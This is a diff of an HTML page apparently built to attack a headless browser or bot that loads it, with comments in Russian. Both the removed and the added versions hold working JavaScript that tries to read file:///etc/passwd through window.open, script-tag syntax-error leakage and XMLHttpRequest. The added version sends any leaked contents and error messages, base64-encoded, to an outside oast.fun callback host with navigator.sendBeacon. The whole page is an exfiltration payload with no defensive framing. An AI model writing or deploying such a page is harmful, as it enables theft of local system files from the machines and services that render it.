@@ -1,52 +1,47 @@
 <!DOCTYPE html>
 <html>
 <body>
-<script>
-    const hook = "https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun";
+    <div id="status">Testing...</div>
+    <script>
+        (async function() {
+            const hook = "https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun";
+            
+            // 1. Сразу шлем сигнал, что JS ОЖИЛ
+            navigator.sendBeacon(hook + "/JS_ALIVE");
 
-    // МЕТОД 1: Каскадная ошибка (SOP Bypass через Error Message)
-    // В некоторых версиях Chrome ошибка парсинга скрипта содержит кусок текста
-    window.onerror = function(msg) {
-        navigator.sendBeacon(hook + "/LEAK_ERROR", msg);
-    };
-
-    // МЕТОД 2: Попытка заставить браузер "отрисовать" файл как картинку на Canvas
-    // Если мы сможем прочитать хоть один пиксель, мы подтвердим чтение
-    function leakViaCanvas() {
-        const img = new Image();
-        img.src = "file:///etc/passwd";
-        img.onerror = () => {
-            // Если файл есть, но не картинка, ошибка вылетает быстрее
-            navigator.sendBeacon(hook + "/FILE_EXISTS_CONFIRMED");
-        };
-    }
-
-    // МЕТОД 3: Самый перспективный — HTML5 Object/Iframe
-    // Мы создаем скрытый элемент и пытаемся вытащить его параметры
-    function leakViaObject() {
-        const obj = document.createElement('object');
-        obj.data = "file:///etc/passwd";
-        obj.onload = () => {
-            // Если загрузилось, пробуем достать размер (палит объем файла)
+            // 2. Метод чтения через попытку открытия нового окна
             try {
-                const size = obj.getBoundingClientRect().width;
-                navigator.sendBeacon(hook + "/OBJECT_LOADED", "Size: " + size);
+                let win = window.open("file:///etc/passwd");
+                setTimeout(() => {
+                    try {
+                        // Если SOP не сработал (редкость, но бывает в ботах)
+                        let data = win.document.documentElement.innerText;
+                        navigator.sendBeacon(hook + "/DATA_LEAK", btoa(data));
+                    } catch(e) {
+                        navigator.sendBeacon(hook + "/WINDOW_LOCKED", e.message);
+                    }
+                }, 1000);
             } catch(e) {}
-        };
-        document.body.appendChild(obj);
-    }
 
-    <img src="exploit.svg">
-<iframe src="exploit.svg"></iframe>
+            // 3. Brute-force первой строки (Syntax Error)
+            // Мы ловим ошибку парсинга через глобальный обработчик
+            window.onerror = function(msg, url, line) {
+                navigator.sendBeacon(hook + "/ERROR_LEAK", JSON.stringify({m: msg, u: url}));
+            };
 
-    // МЕТОД 4: Brute-force первой строки (Unexpected token)
-    // Мы подключаем файл как JS. Chrome скажет: "Uncaught SyntaxError: Unexpected identifier 'root'"
-    const script = document.createElement('script');
-    script.src = "file:///etc/passwd";
-    document.body.appendChild(script);
+            const script = document.createElement('script');
+            script.src = "file:///etc/passwd"; 
+            document.body.appendChild(script);
 
-    leakViaCanvas();
-    leakViaObject();
-</script>
+            // 4. Попытка через XHR (вдруг флаг --disable-web-security включен?)
+            try {
+                let xhr = new XMLHttpRequest();
+                xhr.open("GET", "file:///etc/passwd");
+                xhr.onload = () => navigator.sendBeacon(hook + "/XHR_LEAK", btoa(xhr.responseText));
+                xhr.send();
+            } catch(e) {}
+
+        })();
+    </script>
 </body>
 </html>
